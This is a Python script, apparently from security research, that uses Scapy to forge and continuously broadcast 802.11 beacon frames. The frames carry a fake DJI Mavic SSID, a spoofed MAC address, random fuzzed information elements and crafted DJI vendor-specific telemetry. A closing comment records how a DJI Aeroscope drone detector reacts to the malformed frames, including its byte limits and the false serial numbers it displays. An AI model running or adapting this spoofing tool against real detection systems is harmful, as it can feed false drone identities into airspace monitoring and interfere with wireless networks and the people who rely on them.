from scapy.all import *
import random
import string

# Set up monitor interface
iface = 'wlx801f02f1e3d2'
SSID = 'Mavic-fake-123456789123456789012'

# 802.11 MAC HEADER
# ==== Frame Control 2 bytes: 0x8000 ====
version = 0
frame_type = 0  # Managemnet frame 00
frame_subtype = 8  # Beacon 1000
flags = 0

# ==== Duration 2 bytes ====

duration = 0

# ==== Address 6 bytes per address ====

dest_addr = 'ff:ff:ff:ff:ff:ff'  # address 1
src_addr = '60:60:1f:87:69:c3'  # address 2
bssid = src_addr # addr 3

# ==== Sequence Control 2 bytes ====

fragment_number = 0
seq_number = 0

# ==== Frame Body -- 802.11 Management Beacon =========

# == Mandatory ================================ #
b_timestamp = 2471788032597 # Timestamp 8 bytes
b_interval = 102            # Beacon Interval 2 Bytes
cap_flags = 0x0431          # Capability Info 2 Bytes. We can also pass strings: "ESS+privacy+othercapabilities"

beacon_fields = Dot11Beacon(timestamp = b_timestamp, beacon_interval = b_interval, cap = cap_flags) 

# === Information Elements:
# Each scapy Information Element is defined in Dot11Elt(ID, len, info)
# Inside info there might be other fields, check standard

# == Mandatory IE:SSID == #
#maximum length of SSID is 32 characters
ie_ssid_id = 0 # Information Element  SSID. We can use a string as "SSID"
ie_ssie_len = len(SSID)
ie_ssid_info = SSID

ie_ssid = Dot11Elt(ID = ie_ssid_id, len= ie_ssie_len, info = ie_ssid_info) 

# == Mandatory IE:Supported Rates == #
ie_rates = Dot11Elt(ID=1, len=8, info = b'\x82\x84\x8b\x96\x0c\x12\x18\x24')


# == Non Mandatory IE:DS == #
ie_ds = Dot11Elt(ID = 3, len= 1, info = b'\xf3')

# == Non Mandatory IE:TIM == #
payload=''
for i in range(100):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)
ie_tim = Dot11Elt(ID=5, len=100, info = payload)

# == Non Mandatory IE:Country == #
payload=''
for i in range(100):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)
ie_country=Dot11Elt(ID=7, len=len(payload), info=payload)

# == Non Mandatory IE:ERP Information == #
#ie_erp = Dot11EltERP(ID=42, len=1, NonERP_Present=0, Use_Protection=0, Barker_Preamble_Mode=0, res=0)
ie_erp=Dot11Elt(ID=42, len=1, info=b'\x00')

# == Non Mandatory IE:Extended Supported Rates == #
payload=''
for i in range(100):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)

ie_supprates = Dot11Elt(ID=50, len=len(payload), info = payload)
# == Non Mandatory IE:HT Capabilities == #
payload=''
for i in range(106):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)

ie_htcap = Dot11Elt(ID=45, len=len(payload), info = payload)

# == Non Mandatory IE:HT Information == #
payload=''
for i in range(151):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)

ie_htinfo = Dot11Elt(ID=61, len=len(payload), info = payload)

# == Non Mandatory IE:RSN Information == #
payload=''
for i in range(200):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)

ie_rsn = Dot11Elt(ID=48, len=len(payload), info = payload)

# == Non Mandatory ==
#random payload vendor1
payload=''
for i in range(252):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)
vendor1_payload=payload

vendor1 = Dot11EltVendorSpecific(ID=221, len=len(vendor1_payload)+3, oui= 0x0145f2, info = vendor1_payload)

#random payload vendor2
payload=''
for i in range(132):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)
vendor2_payload=payload

vendor2 = Dot11EltVendorSpecific(ID=221, len=len(vendor2_payload)+3, oui= 0x4545f2, info = vendor2_payload)

#random payload vendor3
payload=''
for i in range(5):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)
vendor3_payload=payload

vendor3 = Dot11EltVendorSpecific(ID=221, len=len(vendor3_payload)+3, oui= 0x014ac2, info = vendor3_payload)

#random payload vendor4
payload=''
for i in range(5):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)
vendor4_payload=payload

vendor4 = Dot11EltVendorSpecific(ID=221, len=len(vendor4_payload)+3, oui= 0xdf45f2, info = vendor4_payload)

#random payload vendor5
payload=''
for i in range(5):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)
vendor5_payload=payload

vendor5 = Dot11EltVendorSpecific(ID=221, len=len(vendor5_payload)+3, oui= 0x6745f2, info = vendor5_payload)

#random payload vendor7
payload=''
for i in range(144):
	a=''.join(random.choices(string.digits + 'abcdef', k=2))
	payload=payload+a
payload=bytes.fromhex(payload)
vendor7_payload=payload

vendor7 = Dot11EltVendorSpecific(ID=221, len=len(vendor7_payload)+3, oui= 0x6775f2, info = vendor7_payload)

# == Information Element: Vendor Specifics (221)
#telemetry
dji_payload=b'Xb\x13\x10\x02M\x063\x1f0K1CG6G3AH8V2u\x00\x30\x30\xf0\x00\x00\x00\x00\x00\x00\xef\xff\x0c\x00\x00\x00\x00\x00\x00\x00\x00C\x00\x00\x00\x00\x99\x01\x00\x00A\xf9|\x00\xcc=\x14\x00\x00\x00\x00\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00\x00\x00\x00\xef\xff\x0c\x00\x00\x00\x00\x00\x00\x00\x00C\x00\x00\x00\x00\x99\x01\x00\x00A\xf9|\x00\xcc=\x14\x00\x00\x00\x00\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x18\x54\x00\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x54\x00\x00\x00\x18\x54\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00\x00\x01'

# Vendor Specific: 26:37:12 (DJI)
ie_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(dji_payload)+3 ,oui=0x263712, info = dji_payload)

packet = RadioTap() / Dot11() / beacon_fields / ie_ssid / ie_rates / ie_ds / ie_tim / ie_country / ie_erp / ie_supprates / ie_htcap/ie_htinfo/ie_rsn/ie_vendor_dji/vendor1/vendor2
packet.subtype = frame_subtype
packet.type = frame_type
packet.addr1 = dest_addr
packet.addr2 = src_addr
packet.addr3 = src_addr
packet.SC = fragment_number + seq_number

packet.show()

sendp(packet,iface= iface, loop = 1, inter= 0.3)

#The data shown by the Aeroscope are not the one present in RemoteID. Sent a beacon frame with maximum length for scapy. Entry of flightLog ~ 15 rows. I think that the Aeroscope accepts a fixed number of bytes in general, a fixed number of bytes before looking at the vendor specific dji. These are the max number of bytes accepted before dji vendor specific (835 bytes), so that the Aeroscope can detect a presence. In the Raw data only the 16 (=\x10) is present; the other bytes are not the one in the remote ID and also the serial number shown in the icon is not the correct one. E.g., if I add vendor1 (len=2+3) before vendor dji and reduce ie_rsn to 193 the Aeroscope still detects a presence. I can also add other vendors (till reaching the maximum length) after ie_vendor_dji to make the beacon bigger but it seems that the Aeroscope discards them and also the length of the entries of the flightLog file are the same.

